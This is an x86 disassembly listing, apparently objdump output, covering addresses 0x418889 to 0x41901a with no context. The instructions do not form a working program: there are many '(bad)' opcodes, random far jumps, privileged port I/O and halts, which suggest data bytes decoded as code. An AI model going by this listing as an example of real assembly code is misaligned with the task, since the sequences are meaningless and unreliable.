  418889:	in     al,dx
  41888a:	push   edi
  41888b:	loope  0x41886b
  41888d:	dec    eax
  41888e:	pop    ebp
  41888f:	popa   
  418890:	push   edx
  418891:	push   eax
  418892:	add    DWORD PTR [eax-0x126b35b4],ebx
  418898:	jmp    0x64bc51e3
  41889d:	(bad)  
  41889e:	fbld   TBYTE PTR [esi+0x4e]
  4188a1:	inc    esp
  4188a2:	loope  0x4188bf
  4188a4:	xchg   BYTE PTR [ecx-0x1c],dh
  4188a7:	cmp    BYTE PTR [esi-0x31],ah
  4188aa:	push   esi
  4188ab:	ins    DWORD PTR es:[edi],dx
  4188ac:	dec    esi
  4188ad:	ss mov ah,0xf4
  4188b0:	gs jp  0x418902
  4188b3:	iret   
  4188b4:	dec    edi
  4188b5:	imul   ebp,DWORD PTR [esi+esi*1+0x79],0x4c
  4188ba:	aaa    
  4188bb:	enter  0x566d,0x19
  4188bf:	aam    0x1a
  4188c1:	hlt    
  4188c2:	sbb    DWORD PTR [edi+edi*8+0x22e9c489],0x252efe82
  4188cd:	or     bl,BYTE PTR [ebx]
  4188cf:	push   eax
  4188d0:	mov    esp,edx
  4188d2:	dec    ecx
  4188d3:	push   0x25f13bfc
  4188d8:	and    ebx,DWORD PTR [esi-0x73]
  4188db:	mov    esi,0x910cf4d3
  4188e0:	out    dx,al
  4188e1:	mov    ecx,0xc587865c
  4188e6:	mov    dl,0x18
  4188e8:	add    al,bl
  4188ea:	mov    ch,cl
  4188ec:	jg     0x4188d7
  4188ee:	fstp   QWORD PTR [ecx+0x4b]
  4188f1:	stos   DWORD PTR es:[edi],eax
  4188f2:	ins    DWORD PTR es:[edi],dx
  4188f3:	ss aad 0x79
  4188f6:	inc    ebp
  4188f7:	push   0xc3deb1e2
  4188fc:	add    ah,dl
  4188fe:	hlt    
  4188ff:	jo     0x41893f
  418901:	div    DWORD PTR [edi-0x16]
  418904:	cwde   
  418905:	call   0x8693:0x287607dc
  41890c:	push   0x23631674
  418911:	mov    eax,DWORD PTR [esp+eax*2]
  418914:	add    DWORD PTR [esi],ebx
  418916:	pop    esi
  418917:	aaa    
  418918:	rol    BYTE PTR [eax+0x28],1
  41891b:	sbb    ebx,0xffffffa1
  41891e:	lods   al,BYTE PTR ds:[esi]
  41891f:	and    ebx,DWORD PTR [edi]
  418921:	cmc    
  418922:	and    DWORD PTR [ecx],esi
  418924:	jne    0x41895e
  418926:	mov    cl,BYTE PTR [ebx-0x52]
  418929:	xchg   ebp,eax
  41892a:	int3   
  41892b:	jb     0x4188e0
  41892d:	fs dec edi
  41892f:	jns    0x418984
  418931:	xor    BYTE PTR [ebp+ebp*2-0x249e535e],ah
  418938:	repz adc al,0x47
  41893b:	inc    esi
  41893c:	pop    eax
  41893d:	push   DWORD PTR [eax-0x2f]
  418940:	dec    ebp
  418941:	ins    BYTE PTR es:[edi],dx
  418942:	xchg   ecx,eax
  418943:	mov    ds:0xdfcca0c3,eax
  418948:	push   eax
  418949:	lock push eax
  41894b:	xlat   BYTE PTR ds:[ebx]
  41894c:	gs push esi
  41894e:	ds mov ecx,0x9e5d9a50
  418954:	test   BYTE PTR [ebx+eax*1-0x29],cl
  418958:	push   ebp
  418959:	mov    cl,0x1c
  41895b:	push   cs
  41895c:	int    0x25
  41895e:	leave  
  41895f:	cmp    al,0xb9
  418961:	leave  
  418962:	dec    esp
  418963:	std    
  418964:	inc    edi
  418965:	adc    BYTE PTR [ebx-0x17],al
  418968:	jecxz  0x418951
  41896a:	push   esp
  41896b:	cs fldl2e 
  41896e:	push   esp
  41896f:	inc    edi
  418970:	rol    BYTE PTR [ecx-0x6cf9796b],1
  418976:	loop   0x418968
  418978:	mov    ebp,0xe13c638a
  41897d:	mov    edi,fs
  41897f:	data16 addr16 cmp al,0xbd
  418983:	(bad)  
  418984:	push   edx
  418985:	inc    ebp
  418986:	loope  0x4189cc
  418988:	aaa    
  418989:	loop   0x4189bc
  41898b:	sub    esp,ebp
  41898d:	sub    dh,BYTE PTR [edx]
  41898f:	les    eax,FWORD PTR [esi]
  418991:	pop    edx
  418992:	test   al,0xc8
  418994:	in     al,dx
  418995:	add    BYTE PTR [edx+0x2d],ch
  418998:	scas   eax,DWORD PTR es:[edi]
  418999:	push   cs
  41899a:	in     al,dx
  41899b:	mov    ds:0x204c03e7,eax
  4189a0:	aam    0xd4
  4189a2:	inc    esp
  4189a3:	add    DWORD PTR [edx-0x43],edi
  4189a6:	fwait
  4189a7:	(bad)  
  4189a8:	sub    ebx,DWORD PTR [ebx]
  4189aa:	js     0x4189b8
  4189ac:	adc    DWORD PTR [edx],esi
  4189ae:	mov    ch,0xcf
  4189b0:	mov    eax,edx
  4189b2:	popa   
  4189b3:	cwde   
  4189b4:	jnp    0x418a20
  4189b6:	cmp    eax,0x8543a46d
  4189bb:	adc    BYTE PTR [ebx-0x57bacb29],dl
  4189c1:	sub    esi,edi
  4189c3:	pusha  
  4189c4:	inc    edi
  4189c5:	dec    ebp
  4189c6:	outs   dx,DWORD PTR ds:[esi]
  4189c7:	mov    edi,0xca0334a7
  4189cc:	(bad)  
  4189cd:	call   0xe07:0x4a7ef878
  4189d4:	das    
  4189d5:	pop    edi
  4189d6:	jmp    FWORD PTR [edi]
  4189d8:	pop    ecx
  4189d9:	xchg   esp,eax
  4189da:	dec    ebx
  4189db:	and    cl,BYTE PTR [ebx+0x6df8b1ee]
  4189e1:	add    al,0xc0
  4189e3:	jmp    0x418a41
  4189e5:	jns    0x4189f1
  4189e7:	enter  0x5ecb,0x15
  4189eb:	mov    edx,0x96df419a
  4189f0:	adc    DWORD PTR [edi],ecx
  4189f2:	lahf   
  4189f3:	cs push ecx
  4189f5:	test   BYTE PTR [edx-0x7eee5d76],ch
  4189fb:	xchg   ebx,eax
  4189fc:	ret    
  4189fd:	cmp    ebp,DWORD PTR [ecx+0x281fd641]
  418a03:	push   0x53ca3e7c
  418a08:	scas   eax,DWORD PTR es:[edi]
  418a09:	cs pop edi
  418a0b:	add    ebx,esp
  418a0d:	into   
  418a0e:	pop    ss
  418a0f:	adc    DWORD PTR [eax+0x30ced5f1],ebx
  418a15:	dec    ebp
  418a16:	pop    esp
  418a17:	cmp    DWORD PTR [esi],ebp
  418a19:	retf   0xba58
  418a1c:	ins    DWORD PTR es:[edi],dx
  418a1d:	xchg   ebp,eax
  418a1e:	push   esp
  418a1f:	jp     0x4189ac
  418a21:	inc    ebp
  418a22:	or     al,0x33
  418a24:	ror    DWORD PTR [ebx-0x3dfc07b3],0xf
  418a2b:	scas   eax,DWORD PTR es:[edi]
  418a2c:	shr    ecx,0xba
  418a2f:	and    eax,DWORD PTR [eax]
  418a31:	add    al,bh
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	aas    
  418a3f:	dec    ebx
  418a40:	mov    ecx,0x611f398a
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	in     al,0x85
  418a4c:	sar    DWORD PTR [edi+ebp*1+0x16],cl
  418a50:	fistp  DWORD PTR [edx+eiz*8+0x1b]
  418a54:	xchg   edx,eax
  418a55:	call   0xcccb:0x3f734828
  418a5c:	mov    eax,0xadba7be6
  418a61:	dec    edx
  418a62:	lock mov bh,0xf9
  418a65:	jno    0x418ae2
  418a67:	push   es
  418a68:	pop    edi
  418a69:	add    DWORD PTR [edi],edx
  418a6b:	rcl    DWORD PTR [edi-0x40],cl
  418a6e:	es dec esp
  418a70:	lahf   
  418a71:	mov    ecx,0xa14c26ac
  418a76:	pop    esi
  418a77:	neg    BYTE PTR [ecx+esi*2]
  418a7a:	xlat   BYTE PTR ds:[ebx]
  418a7b:	cmp    al,0x56
  418a7d:	push   0x7c
  418a7f:	inc    edi
  418a80:	lods   eax,DWORD PTR ds:[esi]
  418a81:	jns    0x418aae
  418a83:	div    DWORD PTR [ecx]
  418a85:	push   edx
  418a86:	fmul   QWORD PTR [ebx]
  418a88:	sbb    eax,0xf9ba3648
  418a8d:	icebp  
  418a8e:	fld    DWORD PTR [eax]
  418a90:	addr16 pop edi
  418a92:	mov    edi,esi
  418a94:	repz es add eax,0x63de298b
  418a9b:	xor    DWORD PTR [ebp-0x6],esi
  418a9e:	push   esi
  418a9f:	pop    eax
  418aa0:	mov    DWORD PTR ds:0xc9dffbac,esi
  418aa6:	sbb    BYTE PTR [edx+0x61],al
  418aa9:	outs   dx,BYTE PTR ds:[esi]
  418aaa:	xchg   edi,eax
  418aab:	addr16 mov eax,ds:0xfdce
  418aaf:	out    0xeb,al
  418ab1:	or     bl,bl
  418ab3:	(bad)  
  418ab4:	fcom   DWORD PTR [edi-0x3f]
  418ab7:	mov    ebp,DWORD PTR ds:0xb6e6641a
  418abd:	or     dh,ch
  418abf:	scas   al,BYTE PTR es:[edi]
  418ac0:	aad    0xac
  418ac2:	sub    eax,0x7b182da7
  418ac7:	into   
  418ac8:	cs mov eax,edx
  418acb:	out    0x6c,eax
  418acd:	or     edx,DWORD PTR [esi+0x2]
  418ad0:	scas   al,BYTE PTR es:[edi]
  418ad1:	dec    edi
  418ad2:	add    BYTE PTR [edx+0x77],cl
  418ad5:	stos   BYTE PTR es:[edi],al
  418ad6:	leave  
  418ad7:	jmp    0x440b753a
  418adc:	stos   BYTE PTR es:[edi],al
  418add:	adc    al,0xff
  418adf:	cli    
  418ae0:	and    bh,0xe1
  418ae3:	adc    BYTE PTR [ebp-0x79],ah
  418ae6:	ficomp WORD PTR [edi+0x71]
  418ae9:	sti    
  418aea:	cmp    ch,cl
  418aec:	or     ch,cl
  418aee:	shl    DWORD PTR [eax+0x7d17ee34],1
  418af4:	add    bh,al
  418af6:	and    eax,0xb4876652
  418afb:	add    ebx,0x5804cfd
  418b01:	jge    0x418b4c
  418b03:	addr16 jg 0x418ab0
  418b06:	jno    0x418a89
  418b08:	lea    eax,ds:[edi-0x10229a34]
  418b0f:	pop    edi
  418b10:	js     0x418ab5
  418b12:	add    al,0x3d
  418b14:	push   edx
  418b15:	retf   0x32bd
  418b18:	aaa    
  418b19:	pop    esi
  418b1a:	hlt    
  418b1b:	push   ecx
  418b1c:	cli    
  418b1d:	das    
  418b1e:	pop    eax
  418b1f:	mov    esp,0x97717c79
  418b24:	mov    fs,WORD PTR [ecx+0xb1b8965]
  418b2a:	mov    dh,0x8d
  418b2c:	xor    DWORD PTR [ebp+0x77],ebx
  418b2f:	cmp    al,0x76
  418b31:	es or  eax,0xf0d4a1f8
  418b37:	outs   dx,DWORD PTR ds:[esi]
  418b38:	dec    esp
  418b39:	imul   ecx
  418b3b:	dec    ebp
  418b3c:	xor    DWORD PTR [esi],ecx
  418b3e:	inc    esp
  418b3f:	sbb    al,0xf8
  418b41:	mov    BYTE PTR [ebp-0x55cba311],ch
  418b47:	addr16 out dx,al
  418b49:	push   ecx
  418b4a:	push   ecx
  418b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b4c:	cli    
  418b4d:	xchg   edi,eax
  418b4e:	mov    dl,0x27
  418b50:	(bad)  
  418b51:	out    0xc4,al
  418b53:	ins    BYTE PTR es:[edi],dx
  418b54:	adc    eax,0xc6630c31
  418b59:	jbe    0x418bb5
  418b5b:	xor    eax,0x82b3c09d
  418b60:	and    al,0xf0
  418b62:	faddp  st(2),st
  418b64:	(bad)  
  418b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b66:	ss pop ebp
  418b68:	sbb    bh,0x49
  418b6b:	jmp    0x418ba7
  418b6d:	or     eax,edi
  418b6f:	adc    eax,0x1b3a3af0
  418b74:	(bad)  
  418b75:	test   DWORD PTR [ebx+0xb],0xbef9a6da
  418b7c:	pop    ebp
  418b7d:	loope  0x418b46
  418b7f:	rcr    edi,0xeb
  418b82:	inc    edi
  418b83:	js     0x418b59
  418b85:	jmp    0x389556fb
  418b8a:	mov    ah,0xaa
  418b8c:	test   DWORD PTR [esi-0x7],esp
  418b8f:	cmp    ch,ch
  418b91:	fcmovbe st,st(7)
  418b93:	arpl   WORD PTR [edx],ax
  418b95:	hlt    
  418b96:	jne    0x418b3b
  418b98:	xchg   edi,eax
  418b99:	mov    DWORD PTR [edi+0x3d53d8b7],ebp
  418b9f:	retf   0xb5b0
  418ba2:	sar    DWORD PTR [edi+0x16],1
  418ba5:	and    al,0xe6
  418ba7:	out    dx,eax
  418ba8:	ret    
  418ba9:	(bad)  
  418baa:	daa    
  418bab:	jecxz  0x418bf0
  418bad:	sar    BYTE PTR [edx+ebp*4+0x3fca79b6],cl
  418bb4:	pop    edi
  418bb5:	push   ebp
  418bb6:	test   BYTE PTR [ecx-0xd],0x63
  418bba:	aam    0x8b
  418bbc:	mov    BYTE PTR [ebx],al
  418bbe:	sub    eax,0x2dfa245d
  418bc3:	cdq    
  418bc4:	call   0x8373:0xc12f0f30
  418bcb:	push   ss
  418bcc:	enter  0xe4a6,0x32
  418bd0:	mov    WORD PTR [ebx],?
  418bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bd3:	bswap  esi
  418bd5:	bound  edx,QWORD PTR ds:[ebp+eiz*1+0x19]
  418bda:	fild   QWORD PTR [ebx+0x2564df14]
  418be0:	ja     0x418baa
  418be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be3:	jns    0x418c10
  418be5:	popa   
  418be6:	clc    
  418be7:	jp     0x418c40
  418be9:	fsub   DWORD PTR [ebx+0x79]
  418bec:	jne    0x418c61
  418bee:	dec    edx
  418bef:	cmp    eax,0xff9d3690
  418bf4:	pop    edi
  418bf5:	xchg   edx,eax
  418bf6:	ret    0xb156
  418bf9:	popa   
  418bfa:	cmp    ch,BYTE PTR [ebp-0x37]
  418bfd:	pop    esp
  418bfe:	jb     0x418be1
  418c00:	sub    BYTE PTR [ecx+0x20],bl
  418c03:	mov    bl,0x1c
  418c05:	and    BYTE PTR fs:[ebp+ebp*2+0x55],bh
  418c0a:	or     al,0x6f
  418c0c:	xchg   ecx,eax
  418c0d:	xchg   edx,eax
  418c0e:	in     al,0x62
  418c10:	push   es
  418c11:	adc    eax,0x869e2629
  418c16:	test   BYTE PTR [ebp+0x661dbb2f],cl
  418c1c:	jmp    0xe73cec64
  418c21:	push   0x76492a4
  418c26:	mov    al,ds:0x7abf4246
  418c2b:	in     al,0x94
  418c2d:	test   eax,0xa3a9f1d8
  418c32:	stc    
  418c33:	stos   BYTE PTR es:[edi],al
  418c34:	xor    esp,edx
  418c36:	fnstsw WORD PTR cs:[esi]
  418c39:	ss cmp eax,0xed4f1f8f
  418c3f:	adc    DWORD PTR [edi],0x6e48ba70
  418c45:	or     BYTE PTR [ebx],0x6a
  418c48:	sbb    DWORD PTR [esi+0x66],0x51
  418c4c:	sbb    eax,0x4f631c68
  418c51:	cld    
  418c52:	pop    edi
  418c53:	rol    DWORD PTR [esi+esi*2-0x3c],cl
  418c57:	mov    eax,0x6a5ce842
  418c5c:	das    
  418c5d:	std    
  418c5e:	mov    ch,BYTE PTR [edx+0xb2c3807]
  418c64:	pop    ebx
  418c65:	call   0x5d23f4c4
  418c6a:	pop    esp
  418c6b:	mov    esp,ecx
  418c6d:	push   cs
  418c6e:	(bad)  
  418c70:	add    BYTE PTR [ecx-0x79ce2e83],bl
  418c76:	leave  
  418c77:	dec    ebp
  418c78:	push   ebp
  418c79:	popf   
  418c7a:	xchg   BYTE PTR [ecx+0x13],dh
  418c7d:	cmp    cl,BYTE PTR [esi-0x2ec3ea9e]
  418c83:	inc    ebx
  418c84:	sahf   
  418c85:	outs   dx,BYTE PTR ds:[esi]
  418c86:	mov    dh,0x5a
  418c88:	and    al,0x6f
  418c8a:	bound  edi,QWORD PTR [eax-0x34]
  418c8d:	jmp    0x96b0:0x4f978ee5
  418c94:	fwait
  418c95:	or     ecx,DWORD PTR [ebp+0x6684da00]
  418c9b:	cmp    ecx,edi
  418c9d:	xchg   ebp,ecx
  418c9f:	mov    al,ds:0x2fccc50e
  418ca4:	int3   
  418ca5:	ror    al,0xea
  418ca8:	lea    ebp,[edi+edi*8-0x2f]
  418cac:	adc    dh,0xf2
  418caf:	hlt    
  418cb0:	push   DWORD PTR [ebx]
  418cb2:	push   es
  418cb3:	mov    bh,0xf
  418cb5:	push   es
  418cb6:	jbe    0x418cb1
  418cb8:	mov    esi,0x796c11de
  418cbd:	ret    0x9a8c
  418cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cc1:	clc    
  418cc2:	mov    ebx,0xe7f1ff0c
  418cc7:	sub    al,0x86
  418cc9:	jecxz  0x418d47
  418ccb:	push   es
  418ccc:	mov    ecx,0x9051ff86
  418cd1:	inc    ecx
  418cd2:	mov    BYTE PTR [eax],dl
  418cd4:	shl    edi,0xc9
  418cd7:	adc    DWORD PTR [ecx+0x7e],ebp
  418cda:	mov    ebx,ss
  418cdc:	add    al,0x17
  418cde:	(bad)  
  418ce0:	xchg   ebp,eax
  418ce1:	aaa    
  418ce2:	bound  esp,QWORD PTR [eax+0x38]
  418ce5:	adc    al,0x4a
  418ce7:	(bad)  
  418ce8:	sar    bl,0x49
  418ceb:	fiadd  WORD PTR [edi+ebx*2+0x1fb63113]
  418cf2:	mov    ebp,0xd8cc7a2c
  418cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf8:	mov    ds:0xdd074141,al
  418cfd:	(bad)  
  418cff:	fdiv   QWORD PTR [edx+0x5d]
  418d02:	add    BYTE PTR [edi-0xb743eed],ch
  418d08:	cld    
  418d09:	push   0x5b1ed26e
  418d0e:	dec    esp
  418d0f:	xor    eax,0x60daccff
  418d14:	adc    eax,0xb9d65a2f
  418d19:	mov    ch,0xce
  418d1b:	and    al,BYTE PTR [edx+0xe]
  418d1e:	sbb    ah,bl
  418d20:	cmp    bl,BYTE PTR [eax]
  418d22:	mov    bh,BYTE PTR [edx]
  418d24:	jno    0x418caf
  418d26:	add    bh,bl
  418d28:	addr16 inc esi
  418d2a:	xchg   edi,eax
  418d2b:	sub    BYTE PTR ds:0xd51304ab,dl
  418d31:	gs push edi
  418d33:	lods   al,BYTE PTR ds:[esi]
  418d34:	xchg   BYTE PTR [eax+0x6a50eaaf],cl
  418d3a:	inc    edx
  418d3b:	mov    ds:0x3670ddfb,eax
  418d40:	mov    ebp,edx
  418d42:	stc    
  418d43:	hlt    
  418d44:	push   0x24
  418d46:	add    BYTE PTR [ebx+0x37],cl
  418d49:	popf   
  418d4a:	retf   0xc70f
  418d4d:	cwde   
  418d4e:	push   0x8be551bb
  418d53:	outs   dx,DWORD PTR ds:[esi]
  418d54:	pusha  
  418d55:	sbb    ecx,ebp
  418d57:	outs   dx,BYTE PTR ds:[esi]
  418d58:	mov    dh,BYTE PTR [edx]
  418d5a:	adc    DWORD PTR [edx+eax*4],edx
  418d5d:	out    0xb8,al
  418d5f:	rcr    DWORD PTR [ebx-0x429165aa],1
  418d65:	xchg   ebx,eax
  418d66:	sbb    DWORD PTR [edi],esi
  418d68:	nop
  418d69:	clc    
  418d6a:	pop    ds
  418d6b:	mov    bl,0xc0
  418d6d:	sub    eax,0xab2d2abf
  418d72:	xchg   esi,eax
  418d73:	lods   eax,DWORD PTR ds:[esi]
  418d74:	or     DWORD PTR [edi+0x65e3188d],edx
  418d7a:	out    dx,al
  418d7b:	mov    fs,WORD PTR [eax]
  418d7d:	shl    BYTE PTR [edi-0x48],1
  418d80:	push   ebp
  418d81:	xor    BYTE PTR [edx],0x10
  418d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d85:	adc    eax,0xf026de4c
  418d8a:	dec    esi
  418d8b:	adc    eax,0x24c94fb2
  418d90:	jns    0x418d23
  418d92:	dec    esi
  418d93:	xor    al,0x52
  418d95:	aas    
  418d96:	jl     0x418e11
  418d98:	sub    DWORD PTR ds:0x91195fcb,edi
  418d9e:	daa    
  418d9f:	adc    eax,DWORD PTR [esp+ebp*4-0x7ad3ae4b]
  418da6:	popa   
  418da7:	sahf   
  418da8:	push   es
  418da9:	mov    esp,ecx
  418dab:	mov    dh,BYTE PTR [edi-0x3c]
  418dae:	or     DWORD PTR [esp+ebp*8-0x3f],edx
  418db2:	(bad)  
  418db3:	clc    
  418db4:	xor    dl,BYTE PTR [ebx]
  418db6:	fisttp WORD PTR [ebx-0x2d04f3c7]
  418dbc:	out    0xf3,al
  418dbe:	inc    edx
  418dbf:	mov    esp,DWORD PTR [edi]
  418dc1:	scas   al,BYTE PTR es:[edi]
  418dc2:	int    0x2b
  418dc4:	adc    edx,DWORD PTR [edi]
  418dc6:	(bad)  
  418dc7:	(bad)  
  418dc9:	or     DWORD PTR [eax+ecx*4+0x18],0xffffffbb
  418dce:	push   DWORD PTR [eax+0x4964d35a]
  418dd4:	pop    ds
  418dd5:	mov    ebp,0x5b1f9804
  418dda:	ror    BYTE PTR [ebp+0x2f8c777c],1
  418de0:	int3   
  418de1:	pop    eax
  418de2:	cmp    BYTE PTR [edx+0x332a80b6],ah
  418de8:	cdq    
  418de9:	cwde   
  418dea:	fnsave [edx+0x79dfc015]
  418df0:	adc    al,0x10
  418df2:	mov    ah,0xf3
  418df4:	int    0x96
  418df6:	cmova  ecx,eax
  418df9:	adc    BYTE PTR [esi+edx*2-0x61],0xb1
  418dfe:	(bad)  
  418dff:	iret   
  418e00:	int    0x6b
  418e02:	mov    edx,ebp
  418e04:	iret   
  418e05:	fwait
  418e06:	add    al,0xa8
  418e08:	push   edx
  418e09:	lds    esi,FWORD PTR [edx-0x7f]
  418e0c:	out    dx,al
  418e0d:	inc    esp
  418e0e:	popf   
  418e0f:	mov    BYTE PTR [edi],ah
  418e11:	in     eax,0x76
  418e13:	sub    eax,0xc1412d6f
  418e18:	je     0x418dae
  418e1a:	bsr    edi,DWORD PTR [ecx+0x6d865e8b]
  418e21:	cld    
  418e22:	xor    al,0x5e
  418e24:	call   0x22de69a2
  418e29:	adc    edi,DWORD PTR [eax+edi*8]
  418e2c:	lds    ecx,FWORD PTR [ebp-0x78]
  418e2f:	cdq    
  418e30:	test   eax,0x59e2f673
  418e35:	mov    esi,0x7a5fe4ae
  418e3a:	mov    dl,0x69
  418e3c:	and    dh,BYTE PTR [ebp-0x2478e901]
  418e42:	pop    edi
  418e43:	pop    eax
  418e44:	push   es
  418e45:	(bad)  
  418e46:	push   ss
  418e47:	mov    ebx,0x152490b2
  418e4c:	out    0x8e,al
  418e4e:	sub    DWORD PTR [ecx-0x34358098],esi
  418e54:	dec    edi
  418e55:	push   ecx
  418e56:	cdq    
  418e57:	add    BYTE PTR [edx],0x8f
  418e5a:	xchg   esp,eax
  418e5b:	sbb    al,0xa9
  418e5d:	dec    ebx
  418e5e:	je     0x418e30
  418e60:	idiv   DWORD PTR [edi+0x5d]
  418e63:	xchg   ebp,eax
  418e64:	lods   eax,DWORD PTR ds:[esi]
  418e65:	sub    DWORD PTR [ebp-0x64fded48],esp
  418e6b:	test   eax,0xc64b5736
  418e70:	cmp    al,0x34
  418e72:	ret    0xa284
  418e75:	add    al,0x21
  418e77:	mov    al,0x5b
  418e79:	push   0x6b822a92
  418e7e:	dec    ebp
  418e7f:	clc    
  418e80:	mov    ch,0x85
  418e82:	inc    esp
  418e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e84:	out    dx,al
  418e85:	fcmovnu st,st(5)
  418e87:	sahf   
  418e88:	mov    ebp,0x602b633d
  418e8d:	mov    bl,0x7e
  418e8f:	sub    ah,BYTE PTR [ebx]
  418e91:	mov    esp,0xe0788a59
  418e96:	adc    cl,dh
  418e98:	jne    0x418ecf
  418e9a:	test   eax,0x146f5143
  418e9f:	arpl   dx,bp
  418ea1:	out    dx,eax
  418ea2:	out    dx,al
  418ea3:	push   ebx
  418ea4:	dec    ecx
  418ea5:	in     al,dx
  418ea6:	and    eax,DWORD PTR [eax-0x62]
  418ea9:	popf   
  418eaa:	xchg   ebx,eax
  418eab:	ins    DWORD PTR es:[edi],dx
  418eac:	jmp    0x418e51
  418eae:	or     ebp,DWORD PTR [ebx-0xf]
  418eb1:	add    edi,DWORD PTR [edi+0x1e7f2e74]
  418eb7:	test   BYTE PTR [edx-0x12955763],0xaf
  418ebe:	pushf  
  418ebf:	cmp    eax,0xe02a2733
  418ec4:	outs   dx,DWORD PTR ds:[esi]
  418ec5:	jmp    0x48419937
  418eca:	jno    0x418ef9
  418ecc:	jg     0x418ede
  418ece:	mov    esp,0x8dae5346
  418ed4:	jno    0x418f0a
  418ed6:	mov    dl,0x77
  418ed8:	xadd   DWORD PTR [eax+ebp*2-0x8e040f],eax
  418ee0:	out    0xb4,al
  418ee2:	lods   al,BYTE PTR ds:[esi]
  418ee3:	or     DWORD PTR [esi+0x6f6d6e82],esi
  418ee9:	ror    DWORD PTR [ebx+0x48],cl
  418eec:	push   edx
  418eed:	(bad)  
  418eee:	mov    bh,0x3
  418ef0:	pop    edi
  418ef1:	mov    edi,0x5f64d8e2
  418ef6:	push   ss
  418ef7:	xor    cl,BYTE PTR [esi-0x34]
  418efa:	imul   edx,DWORD PTR [eax-0x3b],0x28ca4cdd
  418f01:	push   ebx
  418f02:	ins    DWORD PTR es:[edi],dx
  418f03:	mov    al,0x45
  418f05:	cld    
  418f06:	(bad)  
  418f07:	cmp    DWORD PTR [edx],ebp
  418f09:	mov    cl,0xff
  418f0b:	mov    bl,0x33
  418f0d:	add    eax,0xc6c9071
  418f12:	jp     0x418f25
  418f14:	neg    al
  418f16:	dec    eax
  418f17:	stos   BYTE PTR es:[edi],al
  418f18:	je     0x418f5e
  418f1a:	loop   0x418f04
  418f1c:	dec    ebp
  418f1d:	nop
  418f1e:	xchg   edx,eax
  418f1f:	repz or BYTE PTR [edx+ebx*8],0x7f
  418f24:	inc    ecx
  418f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f26:	xor    al,0xcb
  418f28:	cmp    BYTE PTR ds:0x81f933e5,dl
  418f2e:	mov    al,0xa8
  418f30:	fild   WORD PTR [edx+0x1277349c]
  418f36:	mov    ecx,0x2821a6e2
  418f3b:	xchg   ebp,eax
  418f3c:	jecxz  0x418f46
  418f3e:	add    BYTE PTR [ecx+0x33],ch
  418f41:	int3   
  418f42:	rcr    DWORD PTR [edi+0x24ba7c48],cl
  418f48:	sub    eax,0xe19268d4
  418f4d:	stc    
  418f4e:	and    eax,0x217a5992
  418f53:	mov    ebx,0xc35c8796
  418f58:	inc    ebp
  418f59:	dec    edi
  418f5a:	adc    DWORD PTR [esi],esi
  418f5c:	or     al,0xd
  418f5e:	add    edx,DWORD PTR [ecx]
  418f60:	jmp    FWORD PTR [ebp-0x68]
  418f63:	sub    cl,0x74
  418f66:	push   edx
  418f67:	push   ebx
  418f68:	(bad)  
  418f69:	out    dx,al
  418f6a:	stos   BYTE PTR es:[edi],al
  418f6b:	sbb    bl,bl
  418f6d:	lods   eax,DWORD PTR ds:[esi]
  418f6e:	test   al,0x29
  418f70:	retf   
  418f71:	mov    ah,0x11
  418f73:	popa   
  418f74:	xchg   ecx,eax
  418f75:	pushf  
  418f76:	int3   
  418f77:	jne    0x418f5d
  418f79:	aaa    
  418f7a:	jb     0x418fc7
  418f7c:	sub    al,BYTE PTR [esi+0x68593d70]
  418f82:	cs xchg ecx,eax
  418f84:	mov    eax,DWORD PTR [ecx+0x4cef9711]
  418f8a:	ins    BYTE PTR es:[edi],dx
  418f8b:	push   ebx
  418f8c:	in     eax,0x3b
  418f8e:	pop    ebx
  418f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f90:	adc    eax,0x9bbd6465
  418f95:	xor    DWORD PTR [ebx],esp
  418f97:	out    0x79,eax
  418f99:	inc    edx
  418f9a:	jg     0x418f1c
  418f9c:	push   0xb9f80021
  418fa1:	inc    ebp
  418fa2:	outs   dx,DWORD PTR ds:[esi]
  418fa3:	or     al,0x81
  418fa5:	(bad)  
  418fa6:	xor    al,0xc1
  418fa8:	xchg   edi,eax
  418fa9:	arpl   sp,cx
  418fab:	mov    dl,ah
  418fad:	xchg   edx,eax
  418fae:	cs push 0xffffffb2
  418fb1:	sub    BYTE PTR [edi+0x6],cl
  418fb4:	jne    0x41900a
  418fb6:	mov    bl,BYTE PTR [eax+0x4cedb2c4]
  418fbc:	jno    0x419035
  418fbe:	pop    eax
  418fbf:	loop   0x418ff9
  418fc1:	aad    0x1a
  418fc3:	xchg   DWORD PTR [ebx],edx
  418fc5:	xor    DWORD PTR [ecx+0x45],esp
  418fc8:	or     DWORD PTR [esi],esp
  418fca:	ins    BYTE PTR es:[edi],dx
  418fcb:	xor    ecx,edi
  418fcd:	(bad)  
  418fce:	cli    
  418fcf:	dec    edx
  418fd0:	inc    ebx
  418fd1:	fld    DWORD PTR [ecx-0x13b54e09]
  418fd7:	mov    bh,0x41
  418fd9:	mov    esp,gs
  418fdb:	sub    ebp,DWORD PTR ds:0x97ad8912
  418fe1:	mov    esi,0x14f03fc2
  418fe6:	mov    DWORD PTR [esi],esp
  418fe8:	jecxz  0x41902d
  418fea:	mov    edi,0xa546511b
  418fef:	out    dx,al
  418ff0:	es dec ebp
  418ff2:	xchg   BYTE PTR [ebx+0x75b5d214],bh
  418ff8:	sbb    eax,0x44cda92c
  418ffd:	mov    ch,0x90
  418fff:	retf   0x53c0
  419002:	stos   BYTE PTR es:[edi],al
  419003:	ficom  DWORD PTR [eax-0x5b]
  419006:	inc    esp
  419007:	enter  0x7825,0x36
  41900b:	and    bx,WORD PTR [esi]
  41900e:	outs   dx,BYTE PTR ds:[esi]
  41900f:	mov    ebp,0xc01110e5
  419014:	jg     0x419086
  419016:	or     ch,BYTE PTR [edx]
  419018:	sub    edx,DWORD PTR [eax]
  41901a:	pop    ebp
